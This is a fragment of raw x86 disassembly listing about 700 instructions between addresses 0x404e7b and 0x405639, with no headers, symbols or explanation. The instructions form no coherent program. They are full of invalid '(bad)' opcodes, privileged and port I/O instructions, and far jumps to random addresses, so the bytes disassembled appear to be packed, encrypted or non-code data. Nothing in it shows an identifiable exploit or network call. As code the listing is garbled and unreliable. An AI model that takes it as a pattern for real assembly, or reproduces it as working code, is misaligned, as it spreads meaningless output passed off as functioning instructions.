  404e7b:	or     bh,BYTE PTR [eax+edi*2]
  404e7e:	std    
  404e7f:	xor    BYTE PTR [ebx],0x17
  404e82:	fidiv  DWORD PTR [edx]
  404e84:	jmp    0x404e4a
  404e86:	leave  
  404e87:	test   BYTE PTR [ecx+ebx*8],dl
  404e8a:	cwde   
  404e8b:	test   DWORD PTR [ecx+0x36],0x238841e9
  404e92:	mov    dl,BYTE PTR [eax]
  404e94:	(bad)  
  404e95:	fst    DWORD PTR [ebx-0x4e7446ac]
  404e9b:	(bad)  
  404e9c:	(bad)  
  404e9d:	push   edx
  404e9e:	jb     0x404eee
  404ea0:	stc    
  404ea1:	sbb    eax,0x44c7bec2
  404ea6:	sub    ebx,esp
  404ea8:	add    eax,0x73fed616
  404ead:	test   eax,0xf9addbac
  404eb2:	mov    dl,0xb5
  404eb4:	in     eax,dx
  404eb5:	xor    al,0x55
  404eb7:	mov    cl,0x59
  404eb9:	ret    
  404eba:	xor    BYTE PTR [ebp+0x54],ch
  404ebd:	mov    cl,0xc3
  404ebf:	mov    WORD PTR [eax],gs
  404ec1:	dec    edi
  404ec2:	dec    ecx
  404ec3:	sahf   
  404ec4:	sbb    al,0x31
  404ec6:	popa   
  404ec7:	data16 outs dx,BYTE PTR ds:[esi]
  404ec9:	push   ebx
  404eca:	or     al,0x92
  404ecc:	ja     0x404f01
  404ece:	sbb    eax,0x6af931f0
  404ed3:	into   
  404ed4:	add    DWORD PTR [esp+ebp*4],edi
  404ed7:	les    edi,FWORD PTR [ecx]
  404ed9:	fcom   QWORD PTR [esi-0x33bcc2ae]
  404edf:	dec    ah
  404ee1:	pop    esi
  404ee2:	hlt    
  404ee3:	test   DWORD PTR [edx],edi
  404ee5:	pop    ecx
  404ee6:	jmp    0xa450f2d3
  404eeb:	jmp    DWORD PTR [esi]
  404eed:	mov    edi,0xf31c9eee
  404ef2:	int    0x4f
  404ef4:	adc    eax,0x8e5a0868
  404ef9:	jmp    0xb320f710
  404efe:	push   es
  404eff:	ss aaa 
  404f01:	mov    ch,0x8f
  404f03:	aas    
  404f04:	call   FWORD PTR [edx+0x5a]
  404f07:	jmp    0xc10e:0x488799a2
  404f0e:	fiadd  WORD PTR [esi-0x7dba579f]
  404f14:	dec    esi
  404f15:	lods   al,BYTE PTR ds:[esi]
  404f16:	xchg   ebx,eax
  404f17:	test   eax,0x60551cbe
  404f1c:	clc    
  404f1d:	xor    ebx,DWORD PTR [ebx+0x66]
  404f20:	sbb    al,0xc1
  404f22:	rcr    ebp,cl
  404f24:	xchg   esi,eax
  404f25:	loopne 0x404f70
  404f27:	sbb    ch,al
  404f29:	mov    esi,0x2353a8e4
  404f2e:	sub    edx,eax
  404f30:	fisubr DWORD PTR [ecx]
  404f32:	push   ebx
  404f33:	sub    BYTE PTR [ecx+0x52ce96cc],0xdd
  404f3a:	push   esp
  404f3b:	mov    ds:0xd190eb17,al
  404f40:	icebp  
  404f41:	test   al,0x99
  404f43:	adc    eax,0x1d1c86b0
  404f48:	jnp    0x404f93
  404f4a:	aaa    
  404f4b:	sbb    eax,0x62768173
  404f50:	mov    bl,0x62
  404f52:	cld    
  404f53:	cmp    eax,0x94b86ff8
  404f58:	dec    esp
  404f59:	cmp    dh,BYTE PTR [ecx]
  404f5b:	aad    0x75
  404f5d:	jge    0x404fb1
  404f5f:	pop    esp
  404f60:	test   eax,0xac28eff5
  404f65:	mov    eax,ds:0x38f9b827
  404f6a:	inc    esi
  404f6b:	mov    eax,0xa51ad506
  404f70:	aad    0x22
  404f72:	push   esp
  404f73:	jb     0x404f29
  404f75:	push   0xe49054c3
  404f7a:	add    eax,0xcab4249a
  404f7f:	stc    
  404f80:	(bad)  
  404f81:	pop    ss
  404f82:	arpl   WORD PTR [eax+0x220c5467],sp
  404f88:	scas   eax,DWORD PTR es:[edi]
  404f89:	in     eax,0x1b
  404f8b:	jle    0x404f35
  404f8d:	jmp    0xca4aa47f
  404f92:	jns    0x404f41
  404f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f95:	xor    ah,BYTE PTR [edx+0x30]
  404f98:	sbb    ch,BYTE PTR [ebp-0xd]
  404f9b:	mov    ah,dh
  404f9d:	daa    
  404f9e:	mov    ch,0x74
  404fa0:	dec    edi
  404fa1:	adc    ch,BYTE PTR [esi+0x3c]
  404fa4:	fmul   DWORD PTR [ecx]
  404fa6:	sub    dh,al
  404fa8:	int    0xa0
  404faa:	adc    eax,0x656178df
  404faf:	mov    esp,0x8ffd8bee
  404fb4:	fs inc edi
  404fb6:	out    dx,eax
  404fb7:	xchg   esp,eax
  404fb8:	sub    eax,0x39048957
  404fbd:	xchg   BYTE PTR [esp+ecx*2-0x4ac294e4],cl
  404fc4:	xchg   ebp,eax
  404fc5:	xor    BYTE PTR [edi+0x38],ch
  404fc8:	jnp    0x404f85
  404fca:	mov    WORD PTR [edi-0x5e],fs
  404fcd:	scas   al,BYTE PTR es:[edi]
  404fce:	imul   eax,DWORD PTR [ebx-0x33],0xc2dd7ee2
  404fd5:	push   ecx
  404fd6:	pop    esp
  404fd7:	jns    0x404f63
  404fd9:	arpl   WORD PTR [ebx],bp
  404fdb:	cmp    eax,0x1f09dc7c
  404fe0:	jg     0x405056
  404fe2:	mov    BYTE PTR [ecx],dl
  404fe4:	mov    dh,0xcb
  404fe6:	stc    
  404fe7:	push   eax
  404fe8:	in     eax,0x6b
  404fea:	div    DWORD PTR [ecx-0x52]
  404fed:	xor    eax,0x4e4ff04
  404ff2:	mov    dh,0x2
  404ff4:	adc    DWORD PTR [edi+0x47],ebp
  404ff7:	sbb    al,0x8
  404ff9:	(bad)  
  404ffa:	lahf   
  404ffb:	into   
  404ffc:	dec    ebp
  404ffd:	sbb    BYTE PTR [ebx],dh
  404fff:	xchg   edx,eax
  405000:	shl    DWORD PTR ds:0x6caa8769,cl
  405006:	adc    al,0x65
  405008:	add    DWORD PTR [ebx+0x2c45c3b7],eax
  40500e:	sbb    DWORD PTR es:[ebx],esi
  405011:	sub    eax,0x39ddf066
  405016:	inc    edi
  405017:	pushf  
  405018:	inc    ebx
  405019:	into   
  40501a:	xchg   ebp,eax
  40501b:	stc    
  40501c:	mov    eax,ds:0x41e1f657
  405021:	xor    ebx,esp
  405023:	cdq    
  405024:	test   al,0xd3
  405026:	les    edi,FWORD PTR [eax+eax*4-0x43]
  40502a:	ins    DWORD PTR es:[edi],dx
  40502b:	and    BYTE PTR [eax+ecx*4],al
  40502e:	xchg   edx,eax
  40502f:	inc    ebx
  405030:	or     eax,DWORD PTR [eax-0x73f5388d]
  405036:	stc    
  405037:	fimul  DWORD PTR ds:0x9c1a80a
  40503d:	ja     0x405068
  40503f:	mov    cl,0xcc
  405041:	pushf  
  405042:	push   eax
  405043:	jo     0x405020
  405045:	sahf   
  405046:	dec    ebx
  405047:	clc    
  405048:	sbb    al,0x6a
  40504a:	xchg   ecx,eax
  40504b:	pop    es
  40504c:	in     eax,0x6
  40504e:	scas   eax,DWORD PTR es:[edi]
  40504f:	xchg   ecx,eax
  405050:	pop    esp
  405051:	scas   al,BYTE PTR es:[edi]
  405052:	jb     0x40505b
  405054:	aam    0xb9
  405056:	or     esi,DWORD PTR [esi+0x17]
  405059:	imul   eax,DWORD PTR [eax-0x2a1f7d63],0x5f
  405060:	push   ebx
  405061:	mov    edx,0xf54b0b05
  405066:	inc    esp
  405067:	clc    
  405068:	cs nop
  40506a:	pop    es
  40506b:	stc    
  40506c:	and    al,0x6b
  40506e:	sub    al,0xae
  405070:	or     al,0x39
  405072:	pop    es
  405073:	xchg   ebx,eax
  405074:	outs   dx,DWORD PTR ds:[esi]
  405075:	lods   al,BYTE PTR ds:[esi]
  405076:	call   0xd4b9:0x29a66db
  40507d:	(bad)  
  40507e:	cmp    DWORD PTR [edx+edx*8-0x1a],ebp
  405082:	(bad)  
  405083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405084:	pop    es
  405085:	stos   BYTE PTR es:[edi],al
  405086:	xchg   edx,eax
  405087:	jbe    0x405097
  405089:	sub    edx,ecx
  40508b:	iret   
  40508c:	imul   esi,eax,0x6ccd9602
  405092:	scas   eax,DWORD PTR es:[edi]
  405093:	cmp    eax,DWORD PTR [ebp+0x9f89fbd]
  405099:	fld    QWORD PTR [edx-0x44]
  40509c:	xor    ah,BYTE PTR [ecx-0x4c]
  40509f:	and    eax,0x3f28279e
  4050a4:	les    eax,FWORD PTR [ecx+0x79]
  4050a7:	xor    eax,0x1730a675
  4050ac:	into   
  4050ad:	pop    ss
  4050ae:	lahf   
  4050af:	mov    edx,0xf4c44ff1
  4050b4:	pushf  
  4050b5:	inc    ebp
  4050b6:	pop    ecx
  4050b7:	pop    ss
  4050b8:	mov    dl,0x93
  4050ba:	adc    al,0xac
  4050bc:	mov    eax,ds:0xa32cfb43
  4050c1:	xor    dl,BYTE PTR [esi]
  4050c3:	inc    ebx
  4050c4:	pop    ss
  4050c5:	test   eax,0x16ef05e1
  4050ca:	and    ch,dh
  4050cc:	jns    0x405055
  4050ce:	mov    dh,0x1
  4050d0:	push   0xfa80cf4b
  4050d5:	aam    0xba
  4050d7:	scas   eax,DWORD PTR es:[edi]
  4050d8:	call   0xd0d8b62c
  4050dd:	sbb    al,0xa3
  4050df:	adc    cl,BYTE PTR [edx+ebx*2-0x7be94e1b]
  4050e6:	pop    ebp
  4050e7:	xchg   esi,eax
  4050e8:	(bad)
  4050ec:	cmp    BYTE PTR [edx+0x210a834c],dl
  4050f2:	int3   
  4050f3:	or     ecx,DWORD PTR [esi+eax*4]
  4050f6:	in     eax,dx
  4050f7:	or     DWORD PTR fs:[ecx+0x260cc4f5],ebp
  4050fe:	(bad)  
  4050ff:	mov    esp,0x66d86b26
  405104:	in     eax,0xaf
  405106:	fwait
  405107:	xor    BYTE PTR [ebx+ebx*8-0x6a],ah
  40510b:	nop
  40510c:	adc    eax,0x418f2f7
  405111:	xchg   edi,ecx
  405113:	pop    ds
  405114:	push   eax
  405115:	bound  eax,QWORD PTR [esi-0x1a]
  405118:	sub    eax,0x36aa3980
  40511d:	pop    eax
  40511e:	sub    eax,0xc7e98e2
  405123:	mul    BYTE PTR [ecx+0x33f7c0d5]
  405129:	mov    eax,ds:0x35cf0c2f
  40512e:	jne    0x40517d
  405130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405131:	repz jae 0x405101
  405134:	in     eax,dx
  405135:	jns    0x40515f
  405137:	icebp  
  405138:	pop    ebx
  405139:	jnp    0x405126
  40513b:	div    DWORD PTR [eax-0x5d]
  40513e:	aas    
  40513f:	xchg   ecx,eax
  405140:	gs leave 
  405142:	pusha  
  405143:	or     esp,DWORD PTR [esi]
  405145:	loope  0x405146
  405147:	mov    esp,0x928c6203
  40514c:	fld    TBYTE PTR [ebp-0x7e]
  40514f:	(bad)  [eax-0x72]
  405152:	jle    0x405155
  405154:	cli    
  405155:	scas   al,BYTE PTR es:[edi]
  405156:	inc    esi
  405157:	shl    DWORD PTR [eax-0x36],cl
  40515a:	push   ecx
  40515b:	jmp    0x4d9f:0x5f6eac5b
  405162:	inc    edx
  405163:	imul   ebp
  405165:	add    BYTE PTR ds:0x755203e,dl
  40516b:	aam    0xc8
  40516d:	addr16 adc eax,0x9b3a0aef
  405173:	cdq    
  405174:	sub    BYTE PTR [edi],dl
  405176:	rcl    DWORD PTR [ebp+edx*2+0x1a30cf90],1
  40517d:	pop    ebx
  40517e:	pop    ebp
  40517f:	sub    BYTE PTR [ebx-0x4],dh
  405182:	ss inc edx
  405184:	aaa    
  405185:	popf   
  405186:	push   eax
  405187:	mov    DWORD PTR [eax-0x680cd5a7],ebp
  40518d:	jecxz  0x4051f4
  40518f:	pop    ebx
  405190:	test   DWORD PTR [esp+edx*8-0x56],esp
  405194:	sub    al,0xfd
  405196:	imul   ebp,DWORD PTR [ecx],0x46
  405199:	mov    eax,0x20afd082
  40519e:	pop    ebx
  40519f:	dec    edi
  4051a0:	push   ds
  4051a1:	inc    ebp
  4051a2:	jmp    0x188ab29a
  4051a7:	mov    bh,0x94
  4051a9:	push   esi
  4051aa:	stos   BYTE PTR es:[edi],al
  4051ab:	push   ss
  4051ac:	xor    ch,al
  4051ae:	mov    esi,0x43d99484
  4051b3:	xor    BYTE PTR [eax-0x38782b39],bh
  4051b9:	mov    esi,esi
  4051bb:	mov    eax,DWORD PTR [eax-0x63e20a1b]
  4051c1:	sub    DWORD PTR [edi-0x3f],0xa58f5b70
  4051c8:	pop    eax
  4051c9:	sub    eax,0x81d612db
  4051ce:	sti    
  4051cf:	or     edx,DWORD PTR [ecx-0x14]
  4051d2:	cmp    DWORD PTR [eax-0x2f],eax
  4051d5:	sti    
  4051d6:	sub    BYTE PTR [esi-0x498ac88f],al
  4051dc:	xlat   BYTE PTR ds:[ebx]
  4051dd:	sub    DWORD PTR [eax-0x11],eax
  4051e0:	aam    0x42
  4051e2:	fwait
  4051e3:	retf   
  4051e4:	add    BYTE PTR [esi+0x40],0xf
  4051e8:	dec    ecx
  4051e9:	fldcw  WORD PTR [edi-0x2a]
  4051ec:	ins    DWORD PTR es:[edi],dx
  4051ed:	pushf  
  4051ee:	mov    DWORD PTR [eax],edi
  4051f0:	xor    al,0xdd
  4051f2:	xor    bh,BYTE PTR [esi-0x80]
  4051f5:	int3   
  4051f6:	push   ss
  4051f7:	add    eax,0xcde4c75f
  4051fc:	push   0xd9dd4973
  405201:	cli    
  405202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405203:	fcmovbe st,st(1)
  405205:	push   edi
  405206:	loope  0x4051a8
  405208:	ss popa 
  40520a:	sti    
  40520b:	ror    DWORD PTR [ebx],1
  40520d:	jns    0x4051b6
  40520f:	daa    
  405210:	pop    bx
  405212:	sub    esi,esp
  405214:	adc    DWORD PTR ds:0x622e9d2b,edi
  40521a:	pxor   mm3,mm2
  40521d:	mov    edx,0xa341f930
  405222:	mov    ds:0x383fd181,eax
  405227:	xor    al,0x2f
  405229:	xchg   edx,eax
  40522a:	sub    BYTE PTR [edi],dl
  40522c:	repz adc cl,ah
  40522f:	mov    esp,DWORD PTR [edx-0x796e657a]
  405235:	repz pop ss
  405237:	dec    esp
  405238:	(bad)  
  405239:	pop    edi
  40523a:	adc    BYTE PTR [edi+0x58],0xd0
  40523e:	stc    
  40523f:	pusha  
  405240:	inc    esi
  405241:	mov    ebp,0x77d627a4
  405246:	lock add al,0xf2
  405249:	es mov ecx,esp
  40524c:	xchg   BYTE PTR [edi-0x6d],bh
  40524f:	stos   BYTE PTR es:[edi],al
  405250:	xor    ecx,DWORD PTR [eax]
  405252:	in     al,dx
  405253:	jecxz  0x405222
  405255:	push   ss
  405256:	dec    ecx
  405257:	push   cs
  405258:	ins    BYTE PTR es:[edi],dx
  405259:	xor    al,0x60
  40525b:	cwde   
  40525c:	xchg   ecx,eax
  40525d:	sub    eax,0xecb48727
  405262:	xor    esp,DWORD PTR [esi+0x32]
  405265:	and    al,0xef
  405267:	fcomip st,st(3)
  405269:	rcr    DWORD PTR [ecx-0x54],1
  40526c:	sub    edx,DWORD PTR [eax]
  40526e:	or     ch,dl
  405270:	leave  
  405271:	out    0x97,al
  405273:	jp     0x4052a7
  405275:	aas    
  405276:	es pusha 
  405278:	push   esi
  405279:	and    al,0xdf
  40527c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40527d:	mov    ds:0xb357ac4c,eax
  405282:	mov    ah,0xed
  405284:	adc    BYTE PTR es:[esp+ebp*1],0xda
  405289:	cs hlt 
  40528b:	data16 jp 0x40528d
  40528e:	mov    esp,DWORD PTR [edx+ebp*4+0x72]
  405292:	or     BYTE PTR [esi+0x67],bh
  405295:	lea    ecx,[ebx-0xf833adb]
  40529b:	inc    edx
  40529c:	lods   al,BYTE PTR ds:[esi]
  40529d:	test   BYTE PTR [edx],ah
  40529f:	cmp    ecx,DWORD PTR [ecx]
  4052a1:	or     eax,0x9a47aaf
  4052a6:	sub    al,0x12
  4052a8:	inc    esi
  4052a9:	fdivr  QWORD PTR [eax+0x4caffe66]
  4052af:	cdq    
  4052b0:	push   esi
  4052b1:	mov    ah,0x2e
  4052b3:	xchg   ebp,eax
  4052b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052b5:	pop    ss
  4052b6:	jnp    0x4052c7
  4052b8:	cs jl  0x405276
  4052bb:	rcl    DWORD PTR [edi+0x4d0a65c2],0x65
  4052c2:	adc    al,0x12
  4052c4:	sbb    eax,0x35c53477
  4052c9:	lahf   
  4052ca:	test   DWORD PTR [edx+ebx*1],edi
  4052cd:	js     0x40532e
  4052cf:	add    eax,0xd868ff87
  4052d4:	mov    dl,0xf3
  4052d6:	idiv   DWORD PTR [ecx-0x7d518734]
  4052dc:	mov    ch,al
  4052de:	pusha  
  4052df:	jmp    0x68918e79
  4052e4:	fsubrp st(1),st
  4052e6:	retf   
  4052e7:	cmp    al,0xad
  4052e9:	repnz and DWORD PTR [edx],ebp
  4052ec:	xor    al,BYTE PTR [ecx+0x26644860]
  4052f2:	adc    eax,0x9f1f9a17
  4052f7:	cmp    eax,0xef9ef8fe
  4052fc:	enter  0x4bd7,0xd0
  405300:	sbb    esi,DWORD PTR ss:[eax]
  405303:	dec    ecx
  405304:	mov    bh,0xb4
  405306:	nop
  405307:	pusha  
  405308:	jg     0x4052fd
  40530a:	aam    0x65
  40530c:	retf   
  40530d:	cli    
  40530e:	pop    esi
  40530f:	iret   
  405310:	push   edx
  405311:	js     0x40533a
  405313:	das    
  405314:	pop    esp
  405315:	mov    ah,0x4c
  405317:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405319:	xlat   BYTE PTR ds:[ebx]
  40531a:	rcr    DWORD PTR [eax],cl
  40531c:	cmp    BYTE PTR [ebx-0x11a358a3],0x99
  405323:	clc    
  405324:	mov    al,0x4e
  405326:	int3   
  405327:	out    0xec,eax
  405329:	ret    0xa156
  40532c:	mov    dl,0x64
  40532e:	sub    esp,DWORD PTR [ebx+0x53e8cf0]
  405334:	sub    DWORD PTR [ebx*2+0x34e625ce],esp
  40533b:	sub    al,BYTE PTR fs:[ecx-0x781ee9ab]
  405342:	ror    bh,cl
  405344:	mov    edi,fs
  405346:	(bad)  
  405348:	inc    ecx
  405349:	dec    ebp
  40534a:	add    ch,BYTE PTR [esi]
  40534c:	pop    ebp
  40534d:	adc    al,0x3e
  40534f:	lock add ah,0xcb
  405353:	pop    ecx
  405354:	adc    esp,ebp
  405356:	fisttp QWORD PTR [ebp+esi*2+0x67]
  40535a:	xchg   esp,eax
  40535b:	fcomip st,st(3)
  40535d:	push   esp
  40535e:	dec    esp
  40535f:	inc    esi
  405360:	mov    al,0x6b
  405362:	push   esi
  405363:	cmc    
  405364:	pop    edx
  405365:	imul   esp,DWORD PTR [edi+ebp*4+0x74],0x381510f0
  40536d:	dec    esi
  40536e:	test   BYTE PTR [ecx+edx*8+0x65],al
  405372:	imul   edx,DWORD PTR [ebx-0x36554124],0x2d
  405379:	(bad)  
  40537a:	jnp    0x4053d9
  40537c:	ja     0x405399
  40537e:	rcl    DWORD PTR [esi-0x3f],cl
  405381:	daa    
  405382:	dec    ebp
  405383:	loop   0x40531d
  405385:	mov    ebp,0x43bee4b9
  40538a:	aad    0xfa
  40538c:	dec    ebx
  40538d:	das    
  40538e:	psrad  mm6,mm1
  405391:	xchg   ebx,eax
  405392:	stc    
  405393:	xchg   esp,eax
  405394:	inc    ecx
  405395:	outs   dx,DWORD PTR ds:[esi]
  405396:	xor    DWORD PTR [edx],esi
  405398:	add    al,0xa8
  40539a:	inc    eax
  40539b:	jle    0x40540f
  40539d:	cli    
  40539e:	out    0x71,al
  4053a0:	add    eax,0x3fe40e08
  4053a5:	sub    ebp,DWORD PTR [edi+0x2d]
  4053a8:	imul   edx,DWORD PTR [edx-0x1],0x6c
  4053ac:	mov    al,ds:0x790cc38
  4053b1:	in     al,dx
  4053b2:	inc    ecx
  4053b3:	sub    eax,0xd878552
  4053b8:	jb     0x40539e
  4053ba:	jne    0x40539b
  4053bc:	(bad)  
  4053bd:	dec    esi
  4053be:	xor    eax,0xd95acd17
  4053c3:	push   esp
  4053c4:	and    esp,ecx
  4053c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053c7:	inc    edi
  4053c8:	popf   
  4053c9:	test   esi,0x4c3a3725
  4053cf:	outs   dx,DWORD PTR ds:[esi]
  4053d0:	dec    esp
  4053d1:	add    al,0xc8
  4053d3:	pop    eax
  4053d4:	pop    ecx
  4053d5:	fimul  WORD PTR [edi]
  4053d7:	test   BYTE PTR [edx],dl
  4053d9:	popa   
  4053da:	and    cl,cl
  4053dc:	push   esi
  4053dd:	mov    ah,0x48
  4053df:	cmp    ebx,DWORD PTR [esp+eax*1-0x36]
  4053e3:	fst    st(4)
  4053e5:	dec    edi
  4053e6:	shr    DWORD PTR ds:0xb70dca8f,cl
  4053ec:	xor    BYTE PTR [ebp-0x321bc41e],dh
  4053f2:	pop    DWORD PTR cs:[edi-0x71]
  4053f6:	push   edi
  4053f7:	loope  0x4053e1
  4053f9:	inc    esp
  4053fa:	jae    0x4053a0
  4053fc:	adc    eax,0x810e5c91
  405401:	loopne 0x405404
  405403:	cmp    al,0x4a
  405405:	xchg   ebp,eax
  405406:	pop    ecx
  405407:	stos   DWORD PTR es:[edi],eax
  405408:	in     al,0x90
  40540a:	(bad)  
  40540c:	into   
  40540d:	retf   
  40540e:	lods   al,BYTE PTR ds:[esi]
  405410:	push   0x6a
  405412:	push   ss
  405413:	inc    edx
  405414:	push   ss
  405415:	in     eax,0xd9
  405417:	pop    ebp
  405418:	add    DWORD PTR [ecx-0x54],edx
  40541b:	jae    0x40542c
  40541d:	call   0xc598:0x42d7a301
  405424:	call   0x126cbba1
  405429:	sub    al,0x5d
  40542b:	xchg   edx,eax
  40542c:	cmp    ch,al
  40542e:	and    eax,0xba75a81
  405433:	call   0x1f58:0x7d6287cf
  40543a:	mov    BYTE PTR [edi-0x7e],ch
  40543d:	adc    al,0x4e
  40543f:	adc    BYTE PTR [ebp-0xd1b5d79],ch
  405445:	pop    ss
  405446:	adc    eax,0x1248ff9a
  40544b:	stos   DWORD PTR es:[edi],eax
  40544c:	stc    
  40544d:	out    dx,eax
  40544e:	and    DWORD PTR [edx+0x70a5b438],esi
  405454:	dec    eax
  405455:	test   ebx,ebx
  405457:	cmp    BYTE PTR [eax+0x33],bh
  40545a:	rcr    BYTE PTR [ecx],0x9c
  40545d:	out    dx,al
  40545e:	clc    
  40545f:	and    dh,ah
  405461:	mov    ebp,0x8915a705
  405466:	pop    es
  405467:	sahf   
  405468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405469:	out    dx,al
  40546a:	and    al,0x20
  40546c:	dec    esp
  40546d:	fld    QWORD PTR [edi+0x68]
  405470:	rol    DWORD PTR [eax+0xd],1
  405473:	inc    esp
  405474:	or     al,0x94
  405476:	fcom   st(6)
  405478:	add    BYTE PTR [ecx-0x3d9466ad],dl
  40547e:	cld    
  40547f:	or     al,BYTE PTR [edi]
  405481:	mov    ebp,0xd5423930
  405486:	jns    0x4054f7
  405488:	test   BYTE PTR [ebp+0x327921d3],dh
  40548e:	fadd   QWORD PTR [esi+0x29d97e28]
  405494:	mov    WORD PTR [esp+ebp*8+0x52],es
  405498:	cwde   
  405499:	inc    esp
  40549a:	dec    edx
  40549b:	or     edx,DWORD PTR [edx]
  40549d:	cmp    edi,DWORD PTR [esi+0x6f39af10]
  4054a3:	sbb    DWORD PTR [eax],eax
  4054a5:	mov    BYTE PTR [edi-0x5c442a30],0x6b
  4054ac:	enter  0x5baf,0x95
  4054b0:	adc    BYTE PTR [edi-0x61229ce3],bh
  4054b6:	pop    edi
  4054b7:	ins    BYTE PTR es:[edi],dx
  4054b8:	loop   0x4054bc
  4054ba:	clc    
  4054bb:	mov    BYTE PTR [ecx],al
  4054bd:	out    0x4e,eax
  4054bf:	cmp    eax,0x25a37920
  4054c4:	cmp    esp,esp
  4054c6:	call   0x1a48d4aa
  4054cb:	mov    ch,0x6
  4054cd:	pushf  
  4054ce:	(bad)  
  4054cf:	mov    ebp,0x47102a59
  4054d4:	movzx  ebx,WORD PTR [ecx]
  4054d7:	xchg   esi,eax
  4054d8:	xchg   ebp,eax
  4054d9:	adc    al,0xbb
  4054db:	loopne 0x4054da
  4054dd:	and    eax,0xad5d656e
  4054e2:	sub    edi,esi
  4054e4:	push   edx
  4054e5:	hlt    
  4054e6:	(bad)  [ebp-0x45]
  4054e9:	add    DWORD PTR [edi+edx*2],edx
  4054ec:	jns    0x4054b7
  4054ee:	nop
  4054ef:	push   0xb29c5bd2
  4054f4:	mov    eax,0x88d63994
  4054f9:	test   BYTE PTR [eax],cl
  4054fb:	jae    0x40548c
  4054fd:	jmp    0xd667f1fb
  405502:	xchg   edi,eax
  405503:	xchg   edi,eax
  405504:	push   eax
  405505:	call   0x12f5:0x949804d8
  40550c:	repz or al,0x57
  40550f:	dec    DWORD PTR ss:[esi-0x31]
  405513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405514:	sbb    edx,DWORD PTR [ebx+ecx*2-0x39]
  405518:	cdq    
  405519:	jmp    0xc25e6bd1
  40551e:	ja     0x40559c
  405520:	adc    eax,0x47297ed7
  405525:	es mov esp,0xd47f9c5
  40552b:	push   edx
  40552c:	inc    ecx
  40552d:	adc    al,0xc0
  40552f:	outs   dx,BYTE PTR ds:[esi]
  405530:	jnp    0x4054c0
  405532:	ins    BYTE PTR es:[edi],dx
  405533:	mov    bl,0xe3
  405535:	and    eax,0x49afe09c
  40553a:	lahf   
  40553b:	sub    DWORD PTR [edx],esi
  40553d:	test   ebx,ebx
  40553f:	cmp    dl,BYTE PTR [eax+0x69]
  405542:	adc    dl,BYTE PTR [edx]
  405544:	icebp  
  405545:	sti    
  405546:	stc    
  405547:	nop
  405548:	(bad)  
  405549:	fcom   DWORD PTR [esi+0x57]
  40554c:	adc    ecx,DWORD PTR [ebp+0x7]
  40554f:	cli    
  405550:	mov    WORD PTR [ebx-0x72],gs
  405553:	add    dh,BYTE PTR [ebp+0x77dd22fc]
  405559:	(bad)  
  40555a:	sbb    DWORD PTR [edi],edi
  40555c:	and    al,0x13
  40555e:	hlt    
  40555f:	pushf  
  405560:	add    al,0x20
  405562:	je     0x405559
  405564:	scas   eax,DWORD PTR es:[edi]
  405565:	sub    eax,0x884180eb
  40556a:	inc    si
  40556c:	cmp    DWORD PTR [ebp-0x56],esi
  40556f:	cmc    
  405570:	inc    esi
  405571:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405572:	fimul  DWORD PTR [edx-0x2d]
  405575:	add    eax,0x4d444c40
  40557a:	in     eax,0x5c
  40557c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40557d:	jmp    0x329a7764
  405582:	daa    
  405583:	sub    al,0x4c
  405585:	adc    ebx,DWORD PTR [edx]
  405587:	or     ebp,ebx
  405589:	push   es
  40558a:	cs lock dec ecx
  40558d:	mov    cl,0x58
  40558f:	xchg   ebx,eax
  405590:	into   
  405591:	dec    ecx
  405592:	neg    DWORD PTR [eax-0x3a]
  405595:	jne    0x40553d
  405597:	(bad)  
  405598:	js     0x405587
  40559a:	test   eax,0xa8bf79ec
  40559f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055a0:	or     eax,0x301a1f5
  4055a5:	inc    eax
  4055a6:	lahf   
  4055a7:	push   ds
  4055a8:	out    0x3b,eax
  4055aa:	rcl    BYTE PTR ds:0x75ab03f,cl
  4055b0:	fisttp DWORD PTR [eax+ebp*2]
  4055b3:	test   eax,0x7629a5a9
  4055b8:	inc    eax
  4055b9:	xor    BYTE PTR [eax+ebp*8],bh
  4055bc:	es xor eax,0x47be805
  4055c2:	daa    
  4055c3:	(bad)  
  4055c4:	inc    ebp
  4055c5:	gs cld 
  4055c7:	mov    ah,0x2a
  4055c9:	sbb    BYTE PTR [ebx-0x24],ah
  4055cc:	(bad)  
  4055cf:	adc    edx,DWORD PTR [edx-0x3cb7e1b3]
  4055d5:	inc    esi
  4055d6:	xor    ecx,DWORD PTR [esi+0x73]
  4055d9:	(bad)  
  4055da:	(bad)  
  4055db:	pop    esi
  4055dc:	jnp    0x4055a0
  4055de:	jb     0x405639
  4055e0:	xchg   ebx,eax
  4055e1:	test   DWORD PTR [esi+0xf49031c],0x25d72728
  4055eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055ec:	(bad)  
  4055ed:	inc    esi
  4055ee:	sahf   
  4055ef:	jo     0x4055b5
  4055f1:	pop    esi
  4055f2:	fld    st(2)
  4055f4:	(bad)  
  4055f5:	in     al,0x69
  4055f7:	jmp    0x31d7:0x40645d9b
  4055fe:	jne    0x4055dd
  405600:	rcr    DWORD PTR [esi],cl
  405602:	cmp    bl,BYTE PTR [ebx+0x7]
  405605:	test   al,0x65
  405607:	add    cl,ah
  405609:	leave  
  40560a:	xor    BYTE PTR [edi-0x2f],0xd9
  40560e:	jle    0x405666
  405610:	ror    BYTE PTR [ebx],cl
  405612:	scas   al,BYTE PTR es:[edi]
  405613:	lods   eax,DWORD PTR ds:[esi]
  405614:	add    ch,BYTE PTR [edx-0x7f5ddc97]
  40561a:	std    
  40561b:	retf   0x67b1
  40561e:	es inc ecx
  405620:	out    0xe3,eax
  405622:	test   BYTE PTR [eax+0x57],dh
  405625:	enter  0x6c2e,0x7f
  405629:	sub    dl,ah
  40562b:	add    ebx,DWORD PTR [ebx-0x6c]
  40562e:	jge    0x40563f
  405630:	jnp    0x4055b4
  405632:	jbe    0x40566e
  405634:	mov    al,ds:0x3228b738
  405639:	leave  
